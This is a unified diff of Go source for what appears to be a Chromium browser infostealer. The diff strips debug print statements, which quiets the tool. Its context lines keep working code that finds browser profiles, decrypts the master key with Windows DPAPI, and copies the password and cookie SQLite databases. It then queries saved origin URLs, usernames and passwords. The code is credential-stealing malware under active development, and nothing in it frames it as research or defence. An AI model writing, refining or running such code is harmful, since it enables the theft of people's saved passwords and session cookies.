@@ -11,7 +11,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"errors"
-	"fmt"
 	"math/rand/v2"
 	"os"
 	"path/filepath"
@@ -90,7 +89,6 @@ func (state *localState) decryptKey(localpath string, processname string, keytyp
 		windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
 	} else if keytype == "v20" {
 		decoded, _ := base64.StdEncoding.DecodeString(state.OsCrypt.AppBoundEncryptionKey)
-		fmt.Printf("[DEBUG] DPAPI failed, attempting V20 decryption path\n")
 		return /*decryptV20Key(decoded, localpath, processname) [IN DEVELOPMENT AND DOESENT WORK AS OF NOW]*/ nil
 	}
 
@@ -98,7 +96,6 @@ func (state *localState) decryptKey(localpath string, processname string, keytyp
 	key := make([]byte, len(decrypted))
 	copy(key, decrypted)
 
-	fmt.Printf("[DEBUG] Successfully decrypted Master Key via DPAPI\n")
 	return key
 }
 
@@ -119,13 +116,11 @@ func (browser *browserData) detectUsers() {
 		userdata = browser.Localpath
 	}
 
-	fmt.Printf("[DEBUG] Scanning for profiles in: %s\n", userdata)
 	dirs, _ := os.ReadDir(userdata)
 	for _, dir := range dirs {
 		if dir.IsDir() {
 			prefPath := filepath.Join(userdata, dir.Name(), "Preferences")
 			if _, err := os.Stat(prefPath); err == nil {
-				fmt.Printf("[DEBUG] Found profile: %s\n", dir.Name())
 				userstruct := users{
 					Name: dir.Name(),
 				}
@@ -186,14 +181,12 @@ func (browser *browserData) getPasswords() {
 		os.WriteFile(filename, file, 0600)
 		db, err := sql.Open("sqlite", "file:"+filename+"?mode=ro")
 		if err != nil {
-			fmt.Printf("[DEBUG] Failed to open sqlite DB for %s: %v\n", user.Name, err)
 			os.Remove(filename)
 			continue
 		}
 
 		rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
 		if rows == nil {
-			fmt.Printf("[DEBUG] No login rows found for %s\n", user.Name)
 			db.Close()
 			os.Remove(filename)
 			continue
@@ -212,7 +205,6 @@ func (browser *browserData) getPasswords() {
 			browser.Users[i].Passwords = append(browser.Users[i].Passwords, creds)
 			count++
 		}
-		fmt.Printf("[DEBUG] Extracted %d passwords from profile %s\n", count, user.Name)
 		db.Close()
 		rows.Close()
 		os.Remove(filename)
@@ -259,7 +251,6 @@ func (browser *browserData) getCookies() {
 			browser.Users[i].Cookies = append(browser.Users[i].Cookies, cookies)
 			count++
 		}
-		fmt.Printf("[DEBUG] Extracted %d cookies from profile %s\n", count, user.Name)
 		db.Close()
 		rows.Close()
 		os.Remove(filename)
@@ -291,7 +282,6 @@ func (browser *browserData) getLocalState() localState {
 
 func (browsers *BrowserList) populate() {
 	for i, browser := range *browsers {
-		fmt.Printf("[DEBUG] Processing browser: %s\n", browser.Name)
 		state := browser.getLocalState()
 		if state.OsCrypt.EncryptedKey != "" {
 			(*browsers)[i].Key = state.decryptKey(browser.Localpath, browser.ProcessName, "v10")
@@ -301,7 +291,6 @@ func (browsers *BrowserList) populate() {
 		}
 
 		if (*browsers)[i].Key == nil {
-			fmt.Printf("[DEBUG] Could not retrieve key for %s, skipping data extraction\n", browser.Name)
 			continue
 		}
 
@@ -314,17 +303,14 @@ func (browsers *BrowserList) populate() {
 func (browsers *BrowserList) detectBrowsers() {
 	for _, browser := range supportedBrowsers {
 		if exists, e := os.Stat(browser.Path); e == nil && exists.IsDir() {
-			fmt.Printf("[DEBUG] Detected browser: %s at %s\n", browser.Name, browser.Path)
 			browsers.add(browser.Name, browser.Path, browser.Process)
 		}
 	}
 }
 
 func Chromium() BrowserList {
-	fmt.Printf("[DEBUG] Starting Chromium scan...\n")
 	var browsers BrowserList
 	browsers.detectBrowsers()
 	browsers.populate()
-	fmt.Printf("[DEBUG] Chromium scan finished\n")
 	return browsers
 }
